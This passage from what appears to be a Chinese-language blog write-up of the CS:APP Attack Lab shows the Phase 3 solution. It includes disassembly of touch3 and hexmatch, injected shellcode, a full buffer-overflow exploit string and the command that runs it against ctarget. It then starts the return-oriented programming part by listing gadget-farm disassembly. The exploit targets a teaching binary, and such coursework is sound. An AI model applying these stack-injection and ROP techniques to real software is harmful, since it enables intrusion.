class="line"><span class="built_in">printf</span>(<span class="string">&quot;Misfire: You called touch3(\&quot;%s\&quot;)\n&quot;</span>, sval);</span><br><span class="line"><span class="built_in">fail</span>(<span class="number">3</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="number">00000000004018f</span>a &lt;touch3&gt;:</span><br><span class="line">  <span class="number">4018f</span>a:	<span class="number">53</span>                   	push   %rbx</span><br><span class="line">  <span class="number">4018f</span>b:	<span class="number">48</span> <span class="number">89</span> fb             	mov    %rdi,%rbx</span><br><span class="line">  <span class="number">4018f</span>e:	c7 <span class="number">05</span> d4 <span class="number">2b</span> <span class="number">20</span> <span class="number">00</span> <span class="number">03</span> 	movl   $<span class="number">0x3</span>,<span class="number">0x202bd4</span>(%rip)        # <span class="number">6044</span>dc &lt;vlevel&gt;</span><br><span class="line">  <span class="number">401905</span>:	<span class="number">00</span> <span class="number">00</span> <span class="number">00</span> </span><br><span class="line">  <span class="number">401908</span>:	<span class="number">48</span> <span class="number">89</span> fe             	mov    %rdi,%rsi</span><br><span class="line">  <span class="number">40190b</span>:	<span class="number">8b</span> <span class="number">3</span>d d3 <span class="number">2b</span> <span class="number">20</span> <span class="number">00</span>    	mov    <span class="number">0x202bd3</span>(%rip),%edi        # <span class="number">6044e4</span> &lt;cookie&gt;</span><br><span class="line">  <span class="number">401911</span>:	e8 <span class="number">36</span> ff ff ff       	callq  <span class="number">40184</span>c &lt;hexmatch&gt;</span><br><span class="line">  <span class="number">401916</span>:	<span class="number">85</span> c0                	test   %eax,%eax</span><br><span class="line">  <span class="number">401918</span>:	<span class="number">74</span> <span class="number">23</span>                	je     <span class="number">40193</span>d &lt;touch3+<span class="number">0x43</span>&gt;</span><br><span class="line">  <span class="number">40191</span>a:	<span class="number">48</span> <span class="number">89</span> da             	mov    %rbx,%rdx</span><br><span class="line">  <span class="number">40191</span>d:	be <span class="number">38</span> <span class="number">31</span> <span class="number">40</span> <span class="number">00</span>       	mov    $<span class="number">0x403138</span>,%esi</span><br><span class="line">  <span class="number">401922</span>:	bf <span class="number">01</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>       	mov    $<span class="number">0x1</span>,%edi</span><br><span class="line">  <span class="number">401927</span>:	b8 <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>       	mov    $<span class="number">0x0</span>,%eax</span><br><span class="line">  <span class="number">40192</span>c:	e8 bf f4 ff ff       	callq  <span class="number">400</span>df0 &lt;__printf_chk@plt&gt;</span><br><span class="line">  <span class="number">401931</span>:	bf <span class="number">03</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>       	mov    $<span class="number">0x3</span>,%edi</span><br><span class="line">  <span class="number">401936</span>:	e8 <span class="number">52</span> <span class="number">03</span> <span class="number">00</span> <span class="number">00</span>       	callq  <span class="number">401</span>c8d &lt;validate&gt;</span><br><span class="line">  <span class="number">40193b</span>:	eb <span class="number">21</span>                	jmp    <span class="number">40195</span>e &lt;touch3+<span class="number">0x64</span>&gt;</span><br><span class="line">  <span class="number">40193</span>d:	<span class="number">48</span> <span class="number">89</span> da             	mov    %rbx,%rdx</span><br><span class="line">  <span class="number">401940</span>:	be <span class="number">60</span> <span class="number">31</span> <span class="number">40</span> <span class="number">00</span>       	mov    $<span class="number">0x403160</span>,%esi</span><br><span class="line">  <span class="number">401945</span>:	bf <span class="number">01</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>       	mov    $<span class="number">0x1</span>,%edi</span><br><span class="line">  <span class="number">40194</span>a:	b8 <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>       	mov    $<span class="number">0x0</span>,%eax</span><br><span class="line">  <span class="number">40194f</span>:	e8 <span class="number">9</span>c f4 ff ff       	callq  <span class="number">400</span>df0 &lt;__printf_chk@plt&gt;</span><br><span class="line">  <span class="number">401954</span>:	bf <span class="number">03</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>       	mov    $<span class="number">0x3</span>,%edi</span><br><span class="line">  <span class="number">401959</span>:	e8 f1 <span class="number">03</span> <span class="number">00</span> <span class="number">00</span>       	callq  <span class="number">401</span>d4f &lt;fail&gt;</span><br><span class="line">  <span class="number">40195</span>e:	bf <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>       	mov    $<span class="number">0x0</span>,%edi</span><br><span class="line">  <span class="number">401963</span>:	e8 d8 f4 ff ff       	callq  <span class="number">400e40</span> &lt;exit@plt&gt;</span><br></pre></td></tr></table></figure>

<p>Hexmatch C &amp;&amp;Assembly Code</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Compare string to hex represention of unsigned value */</span><span class="comment">//将字符串与无符号值的十六进制表示进行比较</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">hexmatch</span><span class="params">(<span class="type">unsigned</span> val, <span class="type">char</span> *sval)</span> </span>&#123;</span><br><span class="line"><span class="type">char</span> cbuf[<span class="number">110</span>];</span><br><span class="line"><span class="comment">/*Make position of check string unpredictable */</span><span class="comment">//使检查字符串的位置不可预测</span></span><br><span class="line"><span class="type">char</span> *s = cbuf + <span class="built_in">random</span>() % <span class="number">100</span>;</span><br><span class="line"><span class="built_in">sprintf</span>(s, <span class="string">&quot;%.8x&quot;</span>, val);<span class="comment">//将val转为16进制存入s</span></span><br><span class="line"><span class="keyword">return</span> <span class="built_in">strncmp</span>(sval, s, <span class="number">9</span>) == <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="number">000000000040184</span>c &lt;hexmatch&gt;:</span><br><span class="line">  <span class="number">40184</span>c:	<span class="number">41</span> <span class="number">54</span>                	push   %r12</span><br><span class="line">  <span class="number">40184</span>e:	<span class="number">55</span>                   	push   %rbp</span><br><span class="line">  <span class="number">40184f</span>:	<span class="number">53</span>                   	push   %rbx</span><br><span class="line">  <span class="number">401850</span>:	<span class="number">48</span> <span class="number">83</span> c4 <span class="number">80</span>          	add    $<span class="number">0xffffffffffffff80</span>,%rsp</span><br><span class="line">  <span class="number">401854</span>:	<span class="number">41</span> <span class="number">89</span> fc             	mov    %edi,%r12d</span><br><span class="line">  <span class="number">401857</span>:	<span class="number">48</span> <span class="number">89</span> f5             	mov    %rsi,%rbp</span><br><span class="line">  <span class="number">40185</span>a:	<span class="number">64</span> <span class="number">48</span> <span class="number">8b</span> <span class="number">04</span> <span class="number">25</span> <span class="number">28</span> <span class="number">00</span> 	mov    %fs:<span class="number">0x28</span>,%rax</span><br><span class="line">  <span class="number">401861</span>:	<span class="number">00</span> <span class="number">00</span> </span><br><span class="line">  <span class="number">401863</span>:	<span class="number">48</span> <span class="number">89</span> <span class="number">44</span> <span class="number">24</span> <span class="number">78</span>       	mov    %rax,<span class="number">0x78</span>(%rsp)</span><br><span class="line">  <span class="number">401868</span>:	<span class="number">31</span> c0                	<span class="keyword">xor</span>    %eax,%eax</span><br><span class="line">  <span class="number">40186</span>a:	e8 <span class="number">41</span> f5 ff ff       	callq  <span class="number">400</span>db0 &lt;random@plt&gt;</span><br><span class="line">  <span class="number">40186f</span>:	<span class="number">48</span> <span class="number">89</span> c1             	mov    %rax,%rcx</span><br><span class="line">  <span class="number">401872</span>:	<span class="number">48</span> ba <span class="number">0b</span> d7 a3 <span class="number">70</span> <span class="number">3</span>d 	movabs $<span class="number">0xa3d70a3d70a3d70b</span>,%rdx</span><br><span class="line">  <span class="number">401879</span>:	<span class="number">0</span>a d7 a3 </span><br><span class="line">  <span class="number">40187</span>c:	<span class="number">48</span> f7 ea             	imul   %rdx</span><br><span class="line">  <span class="number">40187f</span>:	<span class="number">48</span> <span class="number">01</span> ca             	add    %rcx,%rdx</span><br><span class="line">  <span class="number">401882</span>:	<span class="number">48</span> c1 fa <span class="number">06</span>          	sar    $<span class="number">0x6</span>,%rdx</span><br><span class="line">  <span class="number">401886</span>:	<span class="number">48</span> <span class="number">89</span> c8             	mov    %rcx,%rax</span><br><span class="line">  <span class="number">401889</span>:	<span class="number">48</span> c1 f8 <span class="number">3f</span>          	sar    $<span class="number">0x3f</span>,%rax</span><br><span class="line">  <span class="number">40188</span>d:	<span class="number">48</span> <span class="number">29</span> c2             	sub    %rax,%rdx</span><br><span class="line">  <span class="number">401890</span>:	<span class="number">48</span> <span class="number">8</span>d <span class="number">04</span> <span class="number">92</span>          	<span class="built_in">lea</span>    (%rdx,%rdx,<span class="number">4</span>),%rax</span><br><span class="line">  <span class="number">401894</span>:	<span class="number">48</span> <span class="number">8</span>d <span class="number">04</span> <span class="number">80</span>          	<span class="built_in">lea</span>    (%rax,%rax,<span class="number">4</span>),%rax</span><br><span class="line">  <span class="number">401898</span>:	<span class="number">48</span> c1 e0 <span class="number">02</span>          	shl    $<span class="number">0x2</span>,%rax</span><br><span class="line">  <span class="number">40189</span>c:	<span class="number">48</span> <span class="number">29</span> c1             	sub    %rax,%rcx</span><br><span class="line">  <span class="number">40189f</span>:	<span class="number">48</span> <span class="number">8</span>d <span class="number">1</span>c <span class="number">0</span><span class="function">c          	<span class="title">lea</span>    <span class="params">(%rsp,%rcx,<span class="number">1</span>)</span>,%rbx</span></span><br><span class="line"><span class="function">  4018a3:	<span class="number">45</span> <span class="number">89</span> e0             	mov    %r12d,%r8d</span></span><br><span class="line"><span class="function">  <span class="number">4018</span>a6:	b9 e2 <span class="number">30</span> <span class="number">40</span> <span class="number">00</span>       	mov    $<span class="number">0x4030e2</span>,%ecx</span></span><br><span class="line"><span class="function">  <span class="number">4018</span>ab:	<span class="number">48</span> c7 c2 ff ff ff ff 	mov    $<span class="number">0xffffffffffffffff</span>,%rdx</span></span><br><span class="line"><span class="function">  <span class="number">4018b</span>2:	be <span class="number">01</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>       	mov    $<span class="number">0x1</span>,%esi</span></span><br><span class="line"><span class="function">  <span class="number">4018b</span>7:	<span class="number">48</span> <span class="number">89</span> df             	mov    %rbx,%rdi</span></span><br><span class="line"><span class="function">  <span class="number">4018b</span>a:	b8 <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>       	mov    $<span class="number">0x0</span>,%eax</span></span><br><span class="line"><span class="function">  <span class="number">4018b</span>f:	e8 ac f5 ff ff       	callq  <span class="number">400e70</span> &lt;__sprintf_chk@plt&gt;</span></span><br><span class="line"><span class="function">  <span class="number">4018</span>c4:	ba <span class="number">09</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>       	mov    $<span class="number">0x9</span>,%edx</span></span><br><span class="line"><span class="function">  <span class="number">4018</span>c9:	<span class="number">48</span> <span class="number">89</span> de             	mov    %rbx,%rsi</span></span><br><span class="line"><span class="function">  <span class="number">4018</span>cc:	<span class="number">48</span> <span class="number">89</span> ef             	mov    %rbp,%rdi</span></span><br><span class="line"><span class="function">  <span class="number">4018</span>cf:	e8 cc f3 ff ff       	callq  <span class="number">400</span>ca0 &lt;strncmp@plt&gt;</span></span><br><span class="line"><span class="function">  <span class="number">4018</span>d4:	<span class="number">85</span> c0                	test   %eax,%eax</span></span><br><span class="line"><span class="function">  <span class="number">4018</span>d6:	<span class="number">0f</span> <span class="number">94</span> c0             	sete   %al</span></span><br><span class="line"><span class="function">  <span class="number">4018</span>d9:	<span class="number">0f</span> b6 c0             	movzbl %al,%eax</span></span><br><span class="line"><span class="function">  <span class="number">4018</span>dc:	<span class="number">48</span> <span class="number">8b</span> <span class="number">74</span> <span class="number">24</span> <span class="number">78</span>       	mov    <span class="number">0x78</span>(%rsp),%rsi</span></span><br><span class="line"><span class="function">  <span class="number">4018e1</span>:	<span class="number">64</span> <span class="number">48</span> <span class="number">33</span> <span class="number">34</span> <span class="number">25</span> <span class="number">28</span> <span class="number">00</span> 	xor    %fs:<span class="number">0x28</span>,%rsi</span></span><br><span class="line"><span class="function">  <span class="number">4018e8</span>:	<span class="number">00</span> <span class="number">00</span> </span></span><br><span class="line"><span class="function">  <span class="number">4018</span>ea:	<span class="number">74</span> <span class="number">05</span>                	je     <span class="number">4018f</span>1 &lt;hexmatch+<span class="number">0xa5</span>&gt;</span></span><br><span class="line"><span class="function">  <span class="number">4018</span>ec:	e8 ef f3 ff ff       	callq  <span class="number">400</span>ce0 &lt;__stack_chk_fail@plt&gt;</span></span><br><span class="line"><span class="function">  <span class="number">4018f</span>1:	<span class="number">48</span> <span class="number">83</span> ec <span class="number">80</span>          	sub    $<span class="number">0xffffffffffffff80</span>,%rsp</span></span><br><span class="line"><span class="function">  <span class="number">4018f</span>5:	<span class="number">5b</span>                   	pop    %rbx</span></span><br><span class="line"><span class="function">  <span class="number">4018f</span>6:	<span class="number">5</span>d                   	pop    %rbp</span></span><br><span class="line"><span class="function">  <span class="number">4018f</span>7:	<span class="number">41</span> <span class="number">5</span>c                	pop    %r12</span></span><br><span class="line"><span class="function">  <span class="number">4018f</span>9:	c3                   	retq   </span></span><br></pre></td></tr></table></figure>



<p>Your task is to get CTARGET to execute the code for touch3 rather than returning to test. You must make it appear to touch3 as if you have passed a string representation of your cookie as its argument.<code>您必须使其显示为touch3，就像您已将cookie的字符串表示形式作为其参数一样。</code><br>Some Advice:<br>• You will need to include a string representation of your cookie in your exploit string. The string should consist of the eight hexadecimal digits (ordered from most to least significant) without a leading “0x.”<code>您需要在进攻字符串中包含一个代表你cookie的字符串。该字符串应由八个十六进制数字 (从最高到最低有效排序) 组成，没有前导 “0x”。</code><br>• Recall that a string is represented in C as a sequence of bytes followed by a byte with value 0. Type “man ascii” on any Linux machine to see the byte representations of the characters you need.<code>回想一下，字符串在C中表示为字节序列，后跟值为0的字节。在任何Linux机器上键入 “man ascii” 以查看所需字符的字节表示。</code><br>• Your injected code should set register %rdi to the address of this string.<code>注入的代码应将寄存器 % rdi设置为该字符串的地址。</code><br>• When functions hexmatch and strncmp are called, they push data onto the stack, overwriting portions of memory that held the buffer used by getbuf. As a result, you will need to be careful where you place the string representation of your cookie.<code> 当调用函数hexmatch和strncmp时，它们将数据推送到堆栈上，覆盖保存getbuf使用的缓冲区的内存部分。因此，您需要小心放置cookie的字符串表示形式。</code></p>
<p>解决问题逻辑如下:</p>
<p>我们要实现的功能是让cookie和sval相匹配的话,那么就能通关,sval存放于寄存器%rdi中,以16进制的方式存在,而比较函数中会将cookie转化为16进制,所以我们要将cookie转化为16进制然后写入到%rdi</p>
<p>在呼叫touch3之前我们要把char *sval的值(其指针指向sval这个地址的字串)存入%rdi中,而该地址应该存的是cookie转化为ascii码表示,同时要知道hexmatch一上来就要了110个byte,所以很有可能把缓冲区给重新分配.</p>
<p>为了防止存放的字符串被hexmatch和strncmp覆盖,不能再0x5561dc78-0x5561dca0者之间存放字串,而0x5561dc78是分配的最低位置,0x5561dca0是放置跳转地址的位置,所以我们把字串放在test的栈空间之中比如:0x5561dca8.</p>
<p>操作如下</p>
<ul>
<li>把cookie转换成ascii码,通过查表的方式把cookie挨个转成ascii码.\0–&gt;00</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">35 39 62 39 39 37 66 61 00 #00是字符串结尾</span><br></pre></td></tr></table></figure>

<ul>
<li>将touch3地址压入栈中</li>
<li>将%rsp地址+8—&gt;到%rdi中(当然也可以写精确地址0x5561dca8)</li>
<li>retq</li>
</ul>
<p>构建以下命令,保存为t3.s文件</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">push $0x004018fa</span><br><span class="line">lea 0x8(%rsp),%rdi</span><br><span class="line">retq</span><br></pre></td></tr></table></figure>

<p>然后用Phase_2的方法得到机器指令代码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gcc -c -Og t3.s</span><br><span class="line">objdump -d t3.o&gt;t3.txt</span><br></pre></td></tr></table></figure>

<p>会得到如下代码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">t3.o:     file format elf64-x86-64</span><br><span class="line">0000000000000000 &lt;.text&gt;:</span><br><span class="line">   0:	68 fa 18 40 00       	pushq  $0x4018fa</span><br><span class="line">   5:	48 8d 7c 24 08       	lea    0x8(%rsp),%rdi</span><br><span class="line">   a:	c3                   	retq   </span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>接下来我们就可以编写sol3.txt,记住64位机器输入指令记得补零,不然可能段错误</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">68 fa 18 40 00 48 8d 7c </span><br><span class="line">24 08 c3 00 00 00 00 00//上面的是机器指令代码</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00//填充字符</span><br><span class="line">78 dc 61 55 00 00 00 00 //还是跳转到栈顶,需要padding</span><br><span class="line">35 39 62 39 39 37 66 61 //存再test栈帧中的值,0x5561dca0</span><br><span class="line">00 </span><br></pre></td></tr></table></figure>

<p>最后输入以下指令</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./hex2raw &lt;sol3.txt &gt;sol3r.txt &amp;&amp; ./ctarget -q -i sol3r.txt</span><br></pre></td></tr></table></figure>

<p>若看见以下界面,则恭喜通关!</p>
<p><img src="https://cdn.jsdelivr.net/gh/zhzvite/picgoroom@img/img/202403020220967.png" alt="image-20240302020227034"></p>
<h1 id="Part-II-ROP"><a href="#Part-II-ROP" class="headerlink" title="Part II: ROP"></a>Part II: ROP</h1><h2 id="总览-1"><a href="#总览-1" class="headerlink" title="总览"></a>总览</h2><blockquote>
<p>ROP: Return-Oriented Programming</p>
<p>什么叫Gadgets?思索许久,发现就是断章取义,重塑代码,草船借箭</p>
</blockquote>
<p>得到rtarget的汇编</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">objdump -d rtarget&gt;rtarget.s</span><br></pre></td></tr></table></figure>

<p>Part2的限制:</p>
<ol>
<li>恢复了栈的随机化,每次栈的位置都不一样,无法决定把代码放到哪个位置</li>
<li>恢复了栈的区域标记,分为可写,可读,可执行.</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">堆栈包含一系列小工具地址。每个gadget由一系列指令字节组成，最后一个是0xc3，编码ret指令。当程序从此配置开始执行 ret 指令时，它将启动一系列 gadget 执行，每个 gadget 末尾的 ret 指令导致程序跳转到下一个 gadget 的开头。</span><br><span class="line">小工具可以使用与编译器生成的汇编语言语句相对应的代码，尤其是函数末尾的语句。在实践中，这种形式可能有一些有用的小工具，但不足以实现许多重要的操作。例如，编译函数不太可能将 popq %rdi 作为 ret 之前的最后一条指令。幸运的是，对于面向字节的指令集（例如 x86-64），通常可以通过从指令字节序列的其他部分提取模式来找到小工具。</span><br></pre></td></tr></table></figure>

<p>举一个Gadgets的小例子,这有一个很有意思的小现象</p>
<p>Setval_210’s C &amp;&amp; Assembly Code</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">void setval_210(unsigned * p) &#123; </span><br><span class="line">* p = 3347663060U; </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">0000000000400f15 &lt;setval_210&gt;:</span><br><span class="line">400f15: c7 07 d4 48 89 c7   movl  $0xc78948d4,(%rdi)</span><br><span class="line">400f1b: c3                  retq</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>The byte sequence 48 89 c7 encodes the instruction movq %rax, %rdi. (See Figure 3A for the encodings of useful movq instructions.) This sequence is followed by byte value c3, which encodes the ret instruction. The function starts at address 0x400f15, and the sequence starts on the fourth byte of the function. Thus, this code contains a gadget, having a starting address of 0x400f18, that will copy the 64-bit value in register %rax to register %rdi.</p>
<p><code>断章取义</code></p>
<p><strong>从0x400f18看到0x400f1b表示的意思则是把%rax的值传到%rdi,即为movq %rax , %rdi</strong></p>
<p>Your code for RTARGET contains a number of functions similar to the setval_210 function shown above in a region we refer to as the gadget farm. Your job will be to identify useful gadgets in the gadget farm and use these to perform attacks similar to those you did in Phases 2 and 3.</p>
<p>Important: The gadget farm is demarcated by functions start_farm and end_farm in your copy of rtarget. Do not attempt to construct gadgets from other portions of the program code.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">您的 RTARGET 代码包含许多与上面所示的 setval_210 函数类似的函数，这些函数位于我们称为小工具场的区域中。您的工作将是识别小工具场中有用的小工具，并使用它们来执行类似于您在第 2 阶段和第 3 阶段中所做的攻击。</span><br><span class="line">重要提示：小工具场由 rtarget 副本中的函数 start_farm 和 end_farm 划分。不要尝试从程序代码的其他部分构造小工具。</span><br></pre></td></tr></table></figure>

<h2 id="Phase-4"><a href="#Phase-4" class="headerlink" title="Phase_4"></a>Phase_4</h2><p>Phase_4要求:</p>
<p>For Phase 4,you will repeat the attack of Phase 2, but do so on program RTARGET using gadgets from your gadget farm. You can construct your solution using gadgets consisting of the following instruction types, and using only the ﬁrst eight x86-64 registers (%rax–%rdi).</p>
<ul>
<li>movq : The codes for these are shown in Figure 3A.</li>
</ul>
<p><img src="https://cdn.jsdelivr.net/gh/zhzvite/picgoroom@img/img/202402292127944.png" alt="image-20240229212126798"></p>
<ul>
<li>popq : The codes for these are shown in Figure 3B.</li>
</ul>
<p><img src="https://cdn.jsdelivr.net/gh/zhzvite/picgoroom@img/img/202402292127952.png" alt="image-20240229212144522"></p>
<ul>
<li><p>ret : This instruction is encoded by the single byte 0xc3.</p>
</li>
<li><p>nop : This instruction (pronounced “no op,” which is short for “no operation”) is encoded by the single byte 0x90. Its only effect is to cause the program counter to be incremented by 1.</p>
</li>
</ul>
<p>Some Advice:</p>
<ul>
<li><p>All the gadgets you need can be found in the region of the code for rtarget demarcated by the functions start_farm and mid_farm.</p>
</li>
<li><p>You can do this attack with just two gadgets.</p>
</li>
<li><p>When a gadget uses a popq instruction, it will pop data from the stack. As a result, your exploit string will contain a combination of gadget addresses and data.</p>
</li>
</ul>
<p>要求总结:</p>
<ul>
<li><p>复现phase_2的操作</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mov $0x59b997fa, %rdi</span><br><span class="line">pushq $0x4017ec</span><br><span class="line">ret</span><br></pre></td></tr></table></figure>
</li>
<li><p>只需要用only 第一到第八个寄存器(%rax —&gt; %rdi)</p>
</li>
<li><p>需要注意0xc3为标志的ret</p>
</li>
<li><p>只需要使用两个gadgets</p>
</li>
</ul>
<p>我们知道需要的gadget都存在farm.c中,所以我们先farm.c编译再反汇编得到机器指令+地址,便于寻找,输入以下指令</p>
<p><strong>一定要注意要输入-Og,不然就会使用stack frame pointer,会变得比较复杂</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gcc -c -Og farm.c</span><br><span class="line">objdump -d farm.o&gt;farm.s</span><br></pre></td></tr></table></figure>

<p>我们便会得到farm.s,我们要做的是把0x59b997fa这个值弄到%rdi里面,但是我们知道我们不能用mov来直接mov立即数,因为farm中没有cookie的值,只能另辟蹊径,把这个cookie的值压入栈中然后再popq</p>
<p>操作顺序:</p>
<ul>
<li><p>转移cookie的值转移到%rdi中</p>
</li>
<li><p>把$0x4017ec(touch2地址)压入栈中</p>
</li>
<li><p>ret</p>
</li>
</ul>
<p>这是相关联的函数,需要在其中找到gadgets</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">0000000000000000 &lt;start_farm&gt;:</span><br><span class="line">   0:	f3 0f 1e fa          	endbr64 </span><br><span class="line">   4:	b8 01 00 00 00       	mov    $0x1,%eax</span><br><span class="line">   9:	c3                   	retq   </span><br><span class="line"></span><br><span class="line">000000000000000a &lt;getval_142&gt;:</span><br><span class="line">   a:	f3 0f 1e fa          	endbr64 </span><br><span class="line">   e:	b8 fb 78 90 90       	mov    $0x909078fb,%eax</span><br><span class="line">  13:	c3                   	retq   </span><br><span class="line"></span><br><span class="line">0000000000000014 &lt;addval_273&gt;:</span><br><span class="line">  14:	f3 0f 1e fa          	endbr64 </span><br><span class="line">  18:	8d 87 48 89 c7 c3    	lea    -0x3c3876b8(%rdi),%eax</span><br><span class="line">  1e:	c3                   	retq   </span><br><span class="line"></span><br><span class="line">000000000000001f &lt;addval_219&gt;:</span><br><span class="line">  1f:	f3 0f 1e fa          	endbr64 </span><br><span class="line">  23:	8d 87 51 73 58 90    	lea    -0x6fa78caf(%rdi),%eax</span><br><span class="line">  29:	c3                   	retq   </span><br><span class="line"></span><br><span class="line">000000000000002a &lt;setval_237&gt;:</span><br><span class="line">  2a:	f3 0f 1e fa          	endbr64 </span><br><span class="line">  2e:	c7 07 48 89 c7 c7    	movl   $0xc7c78948,(%rdi)</span><br><span class="line">  34:	c3                   	retq   </span><br><span class="line"></span><br><span class="line">0000000000000035 &lt;setval_424&gt;:</span><br><span class="line">  35:	f3 0f 1e fa          	endbr64 </span><br><span class="line">  39:	c7 07 54 c2 58 92    	movl   $0x9258c254,(%rdi)</span><br><span class="line">  3f:	c3                   	retq   </span><br><span class="line"></span><br><span class="line">0000000000000040 &lt;setval_470&gt;:</span><br><span class="line">  40:	f3 0f 1e fa          	endbr64 </span><br><span class="line">  44:	c7 07 63 48 8d c7    	movl   $0xc78d4863,(%rdi)</span><br><span class="line">  4a:	c3                   	retq   </span><br><span class="line"></span><br><span class="line">000000000000004b &lt;setval_426&gt;:</span><br><span class="line">  4b:	f3 0f 1e fa          	endbr64 </span><br><span class="line">  4f:	c7 07 48 89 c7 90    	movl   $0x90c78948,(%rdi)</span><br><span class="line">  55:	c3                   	retq   </span><br><span class="line"></span><br><span class="line">0000000000000056 &lt;getval_280&gt;:</span><br><span class="line">  56:	f3 0f 1e fa          	endbr64 </span><br><span class="line">  5a:	b8 29 58 90 c3       	mov    $0xc3905829,%eax</span><br><span class="line">  5f:	c3                   	retq   </span><br><span class="line"></span><br><span class="line">0000000000000060 &lt;mid_farm&gt;:</span><br><span class="line">  60:	f3 0f 1e fa          	endbr64 </span><br><span class="line">  64:	b8 01 00 00 00       	mov    $0x1,%eax</span><br><span class="line">  69:	c3                   	retq  </span><br></pre></td></tr></table></figure>

